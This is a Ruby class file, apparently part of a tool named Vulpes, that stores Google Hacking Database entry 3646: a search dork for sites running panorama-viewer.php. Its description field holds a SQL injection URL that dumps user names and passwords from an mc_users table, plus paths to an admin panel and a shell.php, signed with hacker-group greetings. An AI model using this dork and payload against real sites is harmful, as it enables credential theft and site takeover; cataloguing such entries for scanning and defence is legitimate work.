module Dorks
   class Dork3646 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 3646",
            ghdb_url: "https://www.exploit-db.com/ghdb/3646",
            severity: "5",
            category: "advisories_and_vulnerabilities",
            publish_date: "2010-12-14",
            author: "anonymous",
            dork: <<~EDORK,
inurl:panorama-viewer.php?id=
EDORK
            description: <<~EDESC
[-] http://server/panorama-viewer.php?id=-1+UNION+SELECT+1,2,3,group_concat%28user_name,0x3a,user_pwd%29,5,6+from+mc_users-- [-] http://server/adm/users.php [-] http://server/adm/panorama_edit.php?id=1 [-] http://server/listimages/shell.php ################################################################# Great 2 : : h4m1d /sheisebaboo / vc.emliter / Neo / H-SK33PY / Net.Editor / HUrr!c4nE / Cair3x /novin security team and all iranian hackers #################################################################
EDESC
         })

      end
   end
end
